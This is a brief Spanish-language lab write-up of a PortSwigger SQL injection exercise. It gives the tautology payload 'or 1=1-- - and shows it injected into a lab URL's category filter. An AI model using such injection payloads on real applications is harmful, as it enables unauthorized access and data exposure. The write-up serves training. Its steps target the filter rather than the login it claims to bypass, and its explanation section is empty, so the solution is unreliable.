# Lab: SQL injection vulnerability allowing login bypass

- [Lab: SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

## Descripción:

This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.

---

### Explicación:


## Solución:

1. Abrir laboratorio y buscar en donde me puedo autenticar

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/dfe5453b-1098-4799-a0fd-a7a940683d9f)


2. Si filtro puedo empezar a ver el query desde la URL

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/4349813d-9f17-4542-9695-ed2d23113a01)

3. Query que usé

````sql
'or 1=1-- -
````
````http
https://0adf002604af55028177ed87004400b4.web-security-academy.net/filter?category=Lifestyle'or 1=1-- -
````

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/22e3492e-a7c7-4573-a966-73830aa681fe)




